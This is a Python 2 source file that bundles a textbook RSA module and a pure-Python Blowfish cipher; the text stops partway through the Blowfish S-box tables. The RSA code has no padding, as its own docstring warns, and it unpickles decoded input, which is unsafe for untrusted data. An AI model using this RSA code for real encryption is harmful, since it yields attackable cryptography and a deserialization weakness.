#! /usr/bin/python

# 
# Copyright (c) 2010 Xavier Garcia xavi.garcia@gmail.com
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.


import string,cgi,time,binascii, random, sys, cmd, readline, tempfile, os,urllib,re, getopt, os.path
from os import curdir, sep
from subprocess import *
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer



"""RSA module
pri = k[1]                               	//Private part of keys d,p,q

Module for calculating large primes, and RSA encryption, decryption,
signing and verification. Includes generating public and private keys.

WARNING: this code implements the mathematics of RSA. It is not suitable for
real-world secure cryptography purposes. It has not been reviewed by a security
expert. It does not include padding of data. There are many ways in which the
output of this module, when used without any modification, can be sucessfully
attacked.
"""

__author__ = "Sybren Stuvel, Marloes de Boer and Ivo Tamboer"
__date__ = "2010-02-05"
__version__ = '1.3.3'

# NOTE: Python's modulo can return negative numbers. We compensate for
# this behaviour using the abs() function

from cPickle import dumps, loads
import base64
import math
import os
import random
import sys
import types
import zlib

class rsa:
	@staticmethod
	def gcd(p, q):
	    """Returns the greatest common divisor of p and q
	
	
	    >>> gcd(42, 6)
	    6
	    """
	    if p<q: return gcd(q, p)
	    if q == 0: return p
	    return rsa.gcd(q, abs(p%q))
	
	@staticmethod
	def bytes2int(bytes):
	    """Converts a list of bytes or a string to an integer
	
	    >>> (128*256 + 64)*256 + + 15
	    8405007
	    >>> l = [128, 64, 15]
	    >>> bytes2int(l)
	    8405007
	    """
	
	    if not (type(bytes) is types.ListType or type(bytes) is types.StringType):
	        raise TypeError("You must pass a string or a list")
	
	    # Convert byte stream to integer
	    integer = 0
	    for byte in bytes:
	        integer *= 256
	        if type(byte) is types.StringType: byte = ord(byte)
	        integer += byte
	
	    return integer
	
	@staticmethod
	def int2bytes(number):
	    """Converts a number to a string of bytes
	    
	    >>> bytes2int(int2bytes(123456789))
	    123456789
	    """
	
	    if not (type(number) is types.LongType or type(number) is types.IntType):
	        raise TypeError("You must pass a long or an int")
	
	    string = ""
	
	    while number > 0:
	        string = "%s%s" % (chr(number & 0xFF), string)
	        number /= 256
	    
	    return string
	
	@staticmethod
	def fast_exponentiation(a, p, n):
	    """Calculates r = a^p mod n
	    """
	    result = a % n
	    remainders = []
	    while p != 1:
	        remainders.append(p & 1)
	        p = p >> 1
	    while remainders:
	        rem = remainders.pop()
	        result = ((a ** rem) * result ** 2) % n
	    return result
	
	@staticmethod
	def read_random_int(nbits):
	    """Reads a random integer of approximately nbits bits rounded up
	    to whole bytes"""
	
	    nbytes = rsa.ceil(nbits/8.)
	    randomdata = os.urandom(nbytes)
	    return rsa.bytes2int(randomdata)
	
	@staticmethod
	def ceil(x):
	    """ceil(x) -> int(math.ceil(x))"""
	
	    return int(math.ceil(x))
	    
	@staticmethod
	def randint(minvalue, maxvalue):
	    """Returns a random integer x with minvalue <= x <= maxvalue"""
	
	    # Safety - get a lot of random data even if the range is fairly
	    # small
	    min_nbits = 32
	
	    # The range of the random numbers we need to generate
	    range = maxvalue - minvalue
	
	    # Which is this number of bytes
	    rangebytes = rsa.ceil(math.log(range, 2) / 8.)
	
	    # Convert to bits, but make sure it's always at least min_nbits*2
	    rangebits = max(rangebytes * 8, min_nbits * 2)
	    
	    # Take a random number of bits between min_nbits and rangebits
	    nbits = random.randint(min_nbits, rangebits)
	    
	    return (rsa.read_random_int(nbits) % range) + minvalue
	
	@staticmethod
	def fermat_little_theorem(p):
	    """Returns 1 if p may be prime, and something else if p definitely
	    is not prime"""
	
	    a = rsa.randint(1, p-1)
	    return rsa.fast_exponentiation(a, p-1, p)
	
	@staticmethod
	def jacobi(a, b):
	    """Calculates the value of the Jacobi symbol (a/b)
	    """
	
	    if a % b == 0:
	        return 0
	    result = 1
	    while a > 1:
	        if a & 1:
	            if ((a-1)*(b-1) >> 2) & 1:
	                result = -result
	            b, a = a, b % a
	        else:
	            if ((b ** 2 - 1) >> 3) & 1:
	                result = -result
	            a = a >> 1
	    return result
	
	@staticmethod
	def jacobi_witness(x, n):
	    """Returns False if n is an Euler pseudo-prime with base x, and
	    True otherwise.
	    """
	
	    j = rsa.jacobi(x, n) % n
	    f = rsa.fast_exponentiation(x, (n-1)/2, n)
	
	    if j == f: return False
	    return True
	
	@staticmethod
	def randomized_primality_testing(n, k):
	    """Calculates whether n is composite (which is always correct) or
	    prime (which is incorrect with error probability 2**-k)
	
	    Returns False if the number if composite, and True if it's
	    probably prime.
	    """
	
	    q = 0.5     # Property of the jacobi_witness function
	
	    # t = int(math.ceil(k / math.log(1/q, 2)))
	    t = rsa.ceil(k / math.log(1/q, 2))
	    for i in range(t+1):
	        x = rsa.randint(1, n-1)
	        if rsa.jacobi_witness(x, n): return False
	    
	    return True
	
	@staticmethod
	def is_prime(number):
	    """Returns True if the number is prime, and False otherwise.
	
	    >>> is_prime(42)
	    0
	    >>> is_prime(41)
	    1
	    """
	
	    """
	    if not fermat_little_theorem(number) == 1:
	        # Not prime, according to Fermat's little theorem
	        return False
	    """
	
	    if rsa.randomized_primality_testing(number, 5):
	        # Prime, according to Jacobi
	        return True
	    
	    # Not prime
	    return False
	
	    
	@staticmethod
	def getprime(nbits):
	    """Returns a prime number of max. 'math.ceil(nbits/8)*8' bits. In
	    other words: nbits is rounded up to whole bytes.
	
	    >>> p = getprime(8)
	    >>> is_prime(p-1)
	    0
	    >>> is_prime(p)
	    1
	    >>> is_prime(p+1)
	    0
	    """
	
	    nbytes = int(math.ceil(nbits/8.))
	
	    while True:
	        integer = rsa.read_random_int(nbits)
	
	        # Make sure it's odd
	        integer |= 1
	
	        # Test for primeness
	        if rsa.is_prime(integer): break
	
	        # Retry if not prime
	
	    return integer
	
	@staticmethod
	def are_relatively_prime(a, b):
	    """Returns True if a and b are relatively prime, and False if they
	    are not.
	
	    >>> are_relatively_prime(2, 3)
	    1
	    >>> are_relatively_prime(2, 4)
	    0
	    """
	
	    d = rsa.gcd(a, b)
	    return (d == 1)
	
	@staticmethod
	def find_p_q(nbits):
	    """Returns a tuple of two different primes of nbits bits"""
	
	    p = rsa.getprime(nbits)
	    while True:
	        q = rsa.getprime(nbits)
	        if not q == p: break
	    
	    return (p, q)
	
	@staticmethod
	def extended_euclid_gcd(a, b):
	    """Returns a tuple (d, i, j) such that d = gcd(a, b) = ia + jb
	    """
	
	    if b == 0:
	        return (a, 1, 0)
	
	    q = abs(a % b)
	    r = long(a / b)
	    (d, k, l) = rsa.extended_euclid_gcd(b, q)
	
	    return (d, l, k - l*r)
	
	# Main function: calculate encryption and decryption keys
	@staticmethod
	def calculate_keys(p, q, nbits):
	    """Calculates an encryption and a decryption key for p and q, and
	    returns them as a tuple (e, d)"""
	
	    n = p * q
	    phi_n = (p-1) * (q-1)
	
	    while True:
	        # Make sure e has enough bits so we ensure "wrapping" through
	        # modulo n
	        e = rsa.getprime(max(8, nbits/2))
	        if rsa.are_relatively_prime(e, n) and rsa.are_relatively_prime(e, phi_n): break
	
	    (d, i, j) = rsa.extended_euclid_gcd(e, phi_n)
	
	    if not d == 1:
	        raise Exception("e (%d) and phi_n (%d) are not relatively prime" % (e, phi_n))
	
	    if not (e * i) % phi_n == 1:
	        raise Exception("e (%d) and i (%d) are not mult. inv. modulo phi_n (%d)" % (e, i, phi_n))
	
	    return (e, i)
	
	
	@staticmethod
	def gen_keys(nbits):
	    """Generate RSA keys of nbits bits. Returns (p, q, e, d).
	
	    Note: this can take a long time, depending on the key size.
	    """
	
	    while True:
	        (p, q) = rsa.find_p_q(nbits)
	        (e, d) = rsa.calculate_keys(p, q, nbits)
	
	        # For some reason, d is sometimes negative. We don't know how
	        # to fix it (yet), so we keep trying until everything is shiny
	        if d > 0: break
	
	    return (p, q, e, d)
	
	@staticmethod
	def gen_pubpriv_keys(nbits):
	    """Generates public and private keys, and returns them as (pub,
	    priv).
	
	    The public key consists of a dict {e: ..., , n: ....). The private
	    key consists of a dict {d: ...., p: ...., q: ....).
	    """
	    
	    (p, q, e, d) = rsa.gen_keys(nbits)
	
	    return ( {'e': e, 'n': p*q}, {'d': d, 'p': p, 'q': q} )
	
	@staticmethod
	def encrypt_int(message, ekey, n):
	    """Encrypts a message using encryption key 'ekey', working modulo
	    n"""
	
	    if type(message) is types.IntType:
	        return rsa.encrypt_int(long(message), ekey, n)
	
	    if not type(message) is types.LongType:
	        raise TypeError("You must pass a long or an int")
	
	    if message > 0 and \
	            math.floor(math.log(message, 2)) > math.floor(math.log(n, 2)):
	        raise OverflowError("The message is too long")
	
	    return rsa.fast_exponentiation(message, ekey, n)
	
	@staticmethod
	def decrypt_int(cyphertext, dkey, n):
	    """Decrypts a cypher text using the decryption key 'dkey', working
	    modulo n"""
	
	    return rsa.encrypt_int(cyphertext, dkey, n)
	
	@staticmethod
	def sign_int(message, dkey, n):
	    """Signs 'message' using key 'dkey', working modulo n"""
	
	    return rsa.decrypt_int(message, dkey, n)
	
	@staticmethod
	def verify_int(signed, ekey, n):
	    """verifies 'signed' using key 'ekey', working modulo n"""
	
	    return rsa.encrypt_int(signed, ekey, n)
	
	@staticmethod
	def picklechops(chops):
	    """Pickles and base64encodes it's argument chops"""
	
	    value = zlib.compress(dumps(chops))
	    encoded = base64.encodestring(value)
	    return encoded.strip()
	
	@staticmethod
	def unpicklechops(string):
	    """base64decodes and unpickes it's argument string into chops"""
	
	    return loads(zlib.decompress(base64.decodestring(string)))
	
	@staticmethod
	def chopstring(message, key, n, funcref):
	    """Splits 'message' into chops that are at most as long as n,
	    converts these into integers, and calls funcref(integer, key, n)
	    for each chop.
	
	    Used by 'encrypt' and 'sign'.
	    """
	
	    msglen = len(message)
	    mbits = msglen * 8
	    nbits = int(math.floor(math.log(n, 2)))
	    nbytes = nbits / 8
	    blocks = msglen / nbytes
	
	    if msglen % nbytes > 0:
	        blocks += 1
	
	    cypher = []
	    
	    for bindex in range(blocks):
	        offset = bindex * nbytes
	        block = message[offset:offset+nbytes]
	        value = rsa.bytes2int(block)
	        cypher.append(funcref(value, key, n))
	
	    return rsa.picklechops(cypher)
	
	@staticmethod
	def gluechops(chops, key, n, funcref):
	    """Glues chops back together into a string.  calls
	    funcref(integer, key, n) for each chop.
	
	    Used by 'decrypt' and 'verify'.
	    """
	    message = ""
	
	    chops = rsa.unpicklechops(chops)
	    
	    for cpart in chops:
	        mpart = funcref(cpart, key, n)
	        message += rsa.int2bytes(mpart)
	    
	    return message
	
	@staticmethod
	def encrypt(message, key):
	    """Encrypts a string 'message' with the public key 'key'"""
	    
	    return rsa.chopstring(message, key['e'], key['n'], rsa.encrypt_int)
	
	@staticmethod
	def sign(message, key):
	    """Signs a string 'message' with the private key 'key'"""
	    
	    return rsa.chopstring(message, key['d'], key['p']*key['q'], rsa.decrypt_int)
	
	@staticmethod
	def decrypt(cypher, key):
	    """Decrypts a cypher with the private key 'key'"""
	
	    return rsa.gluechops(cypher, key['d'], key['p']*key['q'], rsa.decrypt_int)
	
	@staticmethod
	def verify(cypher, key):
	    """Verifies a cypher with the public key 'key'"""
	
	    return rsa.gluechops(cypher, key['e'], key['n'], rsa.encrypt_int)
	
	
	__all__ = ["gen_pubpriv_keys", "encrypt", "decrypt", "sign", "verify"]
	


#
# blowfish.py
# Copyright (C) 2002 Michael Gilfix <mgilfix@eecs.tufts.edu>
#
# This module is open source; you can redistribute it and/or
# modify it under the terms of the GPL or Artistic License.
# These licenses are available at http://www.opensource.org
#
# This software must be used and distributed in accordance
# with the law. The author claims no liability for its
# misuse.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
#

# This software was modified by Ivan Voras: CTR cipher mode of
# operation was added, together with testing and example code.
# These changes are (c) 2007./08. Ivan Voras <ivoras@gmail.com>
# These changes can be used, modified ad distributed under the
# GPL or Artistic License, the same as the original module.
# All disclaimers of warranty from the original module also
# apply to these changes.

"""
Blowfish Encryption

This module is a pure python implementation of Bruce Schneier's
encryption scheme 'Blowfish'. Blowish is a 16-round Feistel Network
cipher and offers substantial speed gains over DES.

The key is a string of length anywhere between 64 and 448 bits, or
equivalently 8 and 56 bytes. The encryption and decryption functions operate
on 64-bit blocks, or 8 byte strings.

Send questions, comments, bugs my way:
    Michael Gilfix <mgilfix@eecs.tufts.edu>
    
The module has been expanded to include CTR stream encryption/decryption
mode, built from the primitives from the orignal module. This change
did not alter any of the base Blowfish code from the original author.

The author of CTR changes is:
    Ivan Voras <ivoras@gmail.com>
"""

import struct, types

__author__ = "Michael Gilfix <mgilfix@eecs.tufts.edu>"

class Blowfish:

    """Blowfish encryption Scheme

    This class implements the encryption and decryption
    functionality of the Blowfish cipher.

    Public functions:

        def __init__ (self, key)
            Creates an instance of blowfish using 'key'
            as the encryption key. Key is a string of
            length ranging from 8 to 56 bytes (64 to 448
            bits). Once the instance of the object is
            created, the key is no longer necessary.

        def encrypt (self, data):
            Encrypt an 8 byte (64-bit) block of text
            where 'data' is an 8 byte string. Returns an
            8-byte encrypted string.

        def decrypt (self, data):
            Decrypt an 8 byte (64-bit) encrypted block
            of text, where 'data' is the 8 byte encrypted
            string. Returns an 8-byte string of plaintext.

        def cipher (self, xl, xr, direction):
            Encrypts a 64-bit block of data where xl is
            the upper 32-bits and xr is the lower 32-bits.
            'direction' is the direction to apply the
            cipher, either ENCRYPT or DECRYPT constants.
            returns a tuple of either encrypted or decrypted
            data of the left half and right half of the
            64-bit block.

        def initCTR(self):
            Initializes CTR engine for encryption or decryption.
            
        def encryptCTR(self, data):
            Encrypts an arbitrary string and returns the
            encrypted string. The method can be called successively
            for multiple string blocks.
            
        def decryptCTR(self, data):
            Decrypts a string encrypted with encryptCTR() and
            returns the decrypted string.
            
    Private members:

        def __round_func (self, xl)
            Performs an obscuring function on the 32-bit
            block of data 'xl', which is the left half of
            the 64-bit block of data. Returns the 32-bit
            result as a long integer.

    """

    # Cipher directions
    ENCRYPT = 0
    DECRYPT = 1

    # For the __round_func
    modulus = long (2) ** 32

    def __init__ (self, key):

        if not key or len (key) < 8 or len (key) > 56:
            raise RuntimeError, "Attempted to initialize Blowfish cipher with key of invalid length: %s" %len (key)

        self.p_boxes = [
            0x243F6A88, 0x85A308D3, 0x13198A2E, 0x03707344,
            0xA4093822, 0x299F31D0, 0x082EFA98, 0xEC4E6C89,
            0x452821E6, 0x38D01377, 0xBE5466CF, 0x34E90C6C,
            0xC0AC29B7, 0xC97C50DD, 0x3F84D5B5, 0xB5470917,
            0x9216D5D9, 0x8979FB1B
        ]

        self.s_boxes = [
            [
                0xD1310BA6, 0x98DFB5AC, 0x2FFD72DB, 0xD01ADFB7,
                0xB8E1AFED, 0x6A267E96, 0xBA7C9045, 0xF12C7F99,
                0x24A19947, 0xB3916CF7, 0x0801F2E2, 0x858EFC16,
                0x636920D8, 0x71574E69, 0xA458FEA3, 0xF4933D7E,
                0x0D95748F, 0x728EB658, 0x718BCD58, 0x82154AEE,
                0x7B54A41D, 0xC25A59B5, 0x9C30D539, 0x2AF26013,
                0xC5D1B023, 0x286085F0, 0xCA417918, 0xB8DB38EF,
                0x8E79DCB0, 0x603A180E, 0x6C9E0E8B, 0xB01E8A3E,
                0xD71577C1, 0xBD314B27, 0x78AF2FDA, 0x55605C60,
                0xE65525F3, 0xAA55AB94, 0x57489862, 0x63E81440,
                0x55CA396A, 0x2AAB10B6, 0xB4CC5C34, 0x1141E8CE,
                0xA15486AF, 0x7C72E993, 0xB3EE1411, 0x636FBC2A,
                0x2BA9C55D, 0x741831F6, 0xCE5C3E16, 0x9B87931E,
                0xAFD6BA33, 0x6C24CF5C, 0x7A325381, 0x28958677,
                0x3B8F4898, 0x6B4BB9AF, 0xC4BFE81B, 0x66282193,
                0x61D809CC, 0xFB21A991, 0x487CAC60, 0x5DEC8032,
                0xEF845D5D, 0xE98575B1, 0xDC262302, 0xEB651B88,
                0x23893E81, 0xD396ACC5, 0x0F6D6FF3, 0x83F44239,
                0x2E0B4482, 0xA4842004, 0x69C8F04A, 0x9E1F9B5E,
                0x21C66842, 0xF6E96C9A, 0x670C9C61, 0xABD388F0,
                0x6A51A0D2, 0xD8542F68, 0x960FA728, 0xAB5133A3,
                0x6EEF0B6C, 0x137A3BE4, 0xBA3BF050, 0x7EFB2A98,
                0xA1F1651D, 0x39AF0176, 0x66CA593E, 0x82430E88,
                0x8CEE8619, 0x456F9FB4, 0x7D84A5C3, 0x3B8B5EBE,
                0xE06F75D8, 0x85C12073, 0x401A449F, 0x56C16AA6,
                0x4ED3AA62, 0x363F7706, 0x1BFEDF72, 0x429B023D,
                0x37D0D724, 0xD00A1248, 0xDB0FEAD3, 0x49F1C09B,
                0x075372C9, 0x80991B7B, 0x25D479D8, 0xF6E8DEF7,
                0xE3FE501A, 0xB6794C3B, 0x976CE0BD, 0x04C006BA,
                0xC1A94FB6, 0x409F60C4, 0x5E5C9EC2, 0x196A2463,
                0x68FB6FAF, 0x3E6C53B5, 0x1339B2EB, 0x3B52EC6F,
                0x6DFC511F, 0x9B30952C, 0xCC814544, 0xAF5EBD09,
                0xBEE3D004, 0xDE334AFD, 0x660F2807, 0x192E4BB3,
                0xC0CBA857, 0x45C8740F, 0xD20B5F39, 0xB9D3FBDB,
                0x5579C0BD, 0x1A60320A, 0xD6A100C6, 0x402C7279,
                0x679F25FE, 0xFB1FA3CC, 0x8EA5E9F8, 0xDB3222F8,
                0x3C7516DF, 0xFD616B15, 0x2F501EC8, 0xAD0552AB,
                0x323DB5FA, 0xFD238760, 0x53317B48, 0x3E00DF82,
                0x9E5C57BB, 0xCA6F8CA0, 0x1A87562E, 0xDF1769DB,
                0xD542A8F6, 0x287EFFC3, 0xAC6732C6, 0x8C4F5573,
                0x695B27B0, 0xBBCA58C8, 0xE1FFA35D, 0xB8F011A0,
                0x10FA3D98, 0xFD2183B8, 0x4AFCB56C, 0x2DD1D35B,
                0x9A53E479, 0xB6F84565, 0xD28E49BC, 0x4BFB9790,
                0xE1DDF2DA, 0xA4CB7E33, 0x62FB1341, 0xCEE4C6E8,
                0xEF20CADA, 0x36774C01, 0xD07E9EFE, 0x2BF11FB4,
                0x95DBDA4D, 0xAE909198, 0xEAAD8E71, 0x6B93D5A0,
                0xD08ED1D0, 0xAFC725E0, 0x8E3C5B2F, 0x8E7594B7,
                0x8FF6E2FB, 0xF2122B64, 0x8888B812, 0x900DF01C,
                0x4FAD5EA0, 0x688FC31C, 0xD1CFF191, 0xB3A8C1AD,
                0x2F2F2218, 0xBE0E1777, 0xEA752DFE, 0x8B021FA1,
                0xE5A0CC0F, 0xB56F74E8, 0x18ACF3D6, 0xCE89E299,
                0xB4A84FE0, 0xFD13E0B7, 0x7CC43B81, 0xD2ADA8D9,
                0x165FA266, 0x80957705, 0x93CC7314, 0x211A1477,
                0xE6AD2065, 0x77B5FA86, 0xC75442F5, 0xFB9D35CF,
                0xEBCDAF0C, 0x7B3E89A0, 0xD6411BD3, 0xAE1E7E49,
                0x00250E2D, 0x2071B35E, 0x226800BB, 0x57B8E0AF,
                0x2464369B, 0xF009B91E, 0x5563911D, 0x59DFA6AA,
                0x78C14389, 0xD95A537F, 0x207D5BA2, 0x02E5B9C5,
                0x83260376, 0x6295CFA9, 0x11C81968, 0x4E734A41,
                0xB3472DCA, 0x7B14A94A, 0x1B510052, 0x9A532915,
                0xD60F573F, 0xBC9BC6E4, 0x2B60A476, 0x81E67400,
                0x08BA6FB5, 0x571BE91F, 0xF296EC6B, 0x2A0DD915,
                0xB6636521, 0xE7B9F9B6, 0xFF34052E, 0xC5855664,
                0x53B02D5D, 0xA99F8FA1, 0x08BA4799, 0x6E85076A
            ],
            [
                0x4B7A70E9, 0xB5B32944, 0xDB75092E, 0xC4192623,
                0xAD6EA6B0, 0x49A7DF7D, 0x9CEE60B8, 0x8FEDB266,
                0xECAA8C71, 0x699A17FF, 0x5664526C, 0xC2B19EE1,
                0x193602A5, 0x75094C29, 0xA0591340, 0xE4183A3E,
                0x3F54989A, 0x5B429D65, 0x6B8FE4D6, 0x99F73FD6,
                0xA1D29C07, 0xEFE830F5, 0x4D2D38E6, 0xF0255DC1,
                0x4CDD2086, 0x8470EB26, 0x6382E9C6, 0x021ECC5E,
                0x09686B3F, 0x3EBAEFC9, 0x3C971814, 0x6B6A70A1,
                0x687F3584, 0x52A0E286, 0xB79C5305, 0xAA500737,
                0x3E07841C, 0x7FDEAE5C, 0x8E7D44EC, 0x5716F2B8,
                0xB03ADA37, 0xF0500C0D, 0xF01C1F04, 0x0200B3FF,
                0xAE0CF51A, 0x3CB574B2, 0x25837A58, 0xDC0921BD,
                0xD19113F9, 0x7CA92FF6, 0x94324773, 0x22F54701,
                0x3AE5E581, 0x37C2DADC, 0xC8B57634, 0x9AF3DDA7,
                0xA9446146, 0x0FD0030E, 0xECC8C73E, 0xA4751E41,
                0xE238CD99, 0x3BEA0E2F, 0x3280BBA1, 0x183EB331,
                0x4E548B38, 0x4F6DB908, 0x6F420D03, 0xF60A04BF,
                0x2CB81290, 0x24977C79, 0x5679B072, 0xBCAF89AF,
                0xDE9A771F, 0xD9930810, 0xB38BAE12, 0xDCCF3F2E,
                0x5512721F, 0x2E6B7124, 0x501ADDE6, 0x9F84CD87,
                0x7A584718, 0x7408DA17, 0xBC9F9ABC, 0xE94B7D8C,
                0xEC7AEC3A, 0xDB851DFA, 0x63094366, 0xC464C3D2,
                0xEF1C1847, 0x3215D908, 0xDD433B37, 0x24C2BA16,
                0x12A14D43, 0x2A65C451, 0x50940002, 0x133AE4DD,
                0x71DFF89E, 0x10314E55, 0x81AC77D6, 0x5F11199B,
                0x043556F1, 0xD7A3C76B, 0x3C11183B, 0x5924A509,
                0xF28FE6ED, 0x97F1FBFA, 0x9EBABF2C, 0x1E153C6E,
                0x86E34570, 0xEAE96FB1, 0x860E5E0A, 0x5A3E2AB3,
                0x771FE71C, 0x4E3D06FA, 0x2965DCB9, 0x99E71D0F,
                0x803E89D6, 0x5266C825, 0x2E4CC978, 0x9C10B36A,
                0xC6150EBA, 0x94E2EA78, 0xA5FC3C53, 0x1E0A2DF4,
                0xF2F74EA7, 0x361D2B3D, 0x1939260F, 0x19C27960,
                0x5223A708, 0xF71312B6, 0xEBADFE6E, 0xEAC31F66,
                0xE3BC4595, 0xA67BC883, 0xB17F37D1, 0x018CFF28,
                0xC332DDEF, 0xBE6C5AA5, 0x65582185, 0x68AB9802,
                0xEECEA50F, 0xDB2F953B, 0x2AEF7DAD, 0x5B6E2F84,
                0x1521B628, 0x29076170, 0xECDD4775, 0x619F1510,
                0x13CCA830, 0xEB61BD96, 0x0334FE1E, 0xAA0363CF,
                0xB5735C90, 0x4C70A239, 0xD59E9E0B, 0xCBAADE14,
                0xEECC86BC, 0x60622CA7, 0x9CAB5CAB, 0xB2F3846E,
                0x648B1EAF, 0x19BDF0CA, 0xA02369B9, 0x655ABB50,
                0x40685A32, 0x3C2AB4B3, 0x319EE9D5, 0xC021B8F7,
                0x9B540B19, 0x875FA099, 0x95F7997E, 0x623D7DA8,
                0xF837889A, 0x97E32D77, 0x11ED935F, 0x16681281,
                0x0E358829, 0xC7E61FD6, 0x96DEDFA1, 0x7858BA99,
                0x57F584A5, 0x1B227263, 0x9B83C3FF, 0x1AC24696,
                0xCDB30AEB, 0x532E3054, 0x8FD948E4, 0x6DBC3128,
                0x58EBF2EF, 0x34C6FFEA, 0xFE28ED61, 0xEE7C3C73,
                0x5D4A14D9, 0xE864B7E3, 0x42105D14, 0x203E13E0,
                0x45EEE2B6, 0xA3AAABEA, 0xDB6C4F15, 0xFACB4FD0,
                0xC742F442, 0xEF6ABBB5, 0x654F3B1D, 0x41CD2105,
                0xD81E799E, 0x86854DC7, 0xE44B476A, 0x3D816250,
                0xCF62A1F2, 0x5B8D2646, 0xFC8883A0, 0xC1C7B6A3,
                0x7F1524C3, 0x69CB7492, 0x47848A0B, 0x5692B285,
                0x095BBF00, 0xAD19489D, 0x1462B174, 0x23820E00,
                0x58428D2A, 0x0C55F5EA, 0x1DADF43E, 0x233F7061,
                0x3372F092, 0x8D937E41, 0xD65FECF1, 0x6C223BDB,
                0x7CDE3759, 0xCBEE7460, 0x4085F2A7, 0xCE77326E,
                0xA6078084, 0x19F8509E, 0xE8EFD855, 0x61D99735,
                0xA969A7AA, 0xC50C06C2, 0x5A04ABFC, 0x800BCADC,
                0x9E447A2E, 0xC3453484, 0xFDD56705, 0x0E1E9EC9,
                0xDB73DBD3, 0x105588CD, 0x675FDA79, 0xE3674340,
                0xC5C43465, 0x713E38D8, 0x3D28F89E, 0xF16DFF20,
                0x153E21E7, 0x8FB03D4A, 0xE6E39F2B, 0xDB83ADF7
            ],
            [
                0xE93D5A68, 0x948140F7, 0xF64C261C, 0x94692934,
                0x411520F7, 0x7602D4F7, 0xBCF46B2E, 0xD4A20068,
                0xD4082471, 0x3320F46A, 0x43B7D4B7, 0x500061AF,
                0x1E39F62E, 0x97244546, 0x14214F74, 0xBF8B8840,
                0x4D95FC1D, 0x96B591AF, 0x70F4DDD3, 0x66A02F45,
                0xBFBC09EC, 0x03BD9785, 0x7FAC6DD0, 0x31CB8504,
                0x96EB27B3, 0x55FD3941, 0xDA2547E6, 0xABCA0A9A,
                0x28507825, 0x530429F4, 0x0A2C86DA, 0xE9B66DFB,
                0x68DC1462, 0xD7486900, 0x680EC0A4, 0x27A18DEE,
                0x4F3FFEA2, 0xE887AD8C, 0xB58CE006, 0x7AF4D6B6,
                0xAACE1E7C, 0xD3375FEC, 0xCE78A399, 0x406B2A42,
                0x20FE9E35, 0xD9F385B9, 0xEE39D7AB, 0x3B124E8B,
                0x1DC9FAF7, 0x4B6D1856, 0x26A36631, 0xEAE397B2,
                0x3A6EFA74, 0xDD5B4332, 0x6841E7F7, 0xCA7820FB,
                0xFB0AF54E, 0xD8FEB397, 0x454056AC, 0xBA489527,
                0x55533A3A, 0x20838D87, 0xFE6BA9B7, 0xD096954B,
                0x55A867BC, 0xA1159A58, 0xCCA92963, 0x99E1DB33,
                0xA62A4A56, 0x3F3125F9, 0x5EF47E1C, 0x9029317C,
                0xFDF8E802, 0x04272F70, 0x80BB155C, 0x05282CE3,
                0x95C11548, 0xE4C66D22, 0x48C1133F, 0xC70F86DC,
                0x07F9C9EE, 0x41041F0F, 0x404779A4, 0x5D886E17,
                0x325F51EB, 0xD59BC0D1, 0xF2BCC18F, 0x41113564,
                0x257B7834, 0x602A9C60, 0xDFF8E8A3, 0x1F636C1B,
                0x0E12B4C2, 0x02E1329E, 0xAF664FD1, 0xCAD18115,
                0x6B2395E0, 0x333E92E1, 0x3B240B62, 0xEEBEB922,
                0x85B2A20E, 0xE6BA0D99, 0xDE720C8C, 0x2DA2F728,
                0xD0127845, 0x95B794FD, 0x647D0862, 0xE7CCF5F0,
                0x5449A36F, 0x877D48FA, 0xC39DFD27, 0xF33E8D1E,
                0x0A476341, 0x992EFF74, 0x3A6F6EAB, 0xF4F8FD37,
                0xA812DC60, 0xA1EBDDF8, 0x991BE14C, 0xDB6E6B0D,
                0xC67B5510, 0x6D672C37, 0x2765D43B, 0xDCD0E804,
                0xF1290DC7, 0xCC00FFA3, 0xB5390F92, 0x690FED0B,
                0x667B9FFB, 0xCEDB7D9C, 0xA091CF0B, 0xD9155EA3,
                0xBB132F88, 0x515BAD24, 0x7B9479BF, 0x763BD6EB,
                0x37392EB3, 0xCC115979, 0x8026E297, 0xF42E312D,
                0x6842ADA7, 0xC66A2B3B, 0x12754CCC, 0x782EF11C,
                0x6A124237, 0xB79251E7, 0x06A1BBE6, 0x4BFB6350,
                0x1A6B1018, 0x11CAEDFA, 0x3D25BDD8, 0xE2E1C3C9,
                0x44421659, 0x0A121386, 0xD90CEC6E, 0xD5ABEA2A,
                0x64AF674E, 0xDA86A85F, 0xBEBFE988, 0x64E4C3FE,
                0x9DBC8057, 0xF0F7C086, 0x60787BF8, 0x6003604D,
                0xD1FD8346, 0xF6381FB0, 0x7745AE04, 0xD736FCCC,
                0x83426B33, 0xF01EAB71, 0xB0804187, 0x3C005E5F,
                0x77A057BE, 0xBDE8AE24, 0x55464299, 0xBF582E61,
                0x4E58F48F, 0xF2DDFDA2, 0xF474EF38, 0x8789BDC2,
                0x5366F9C3, 0xC8B38E74, 0xB475F255, 0x46FCD9B9,
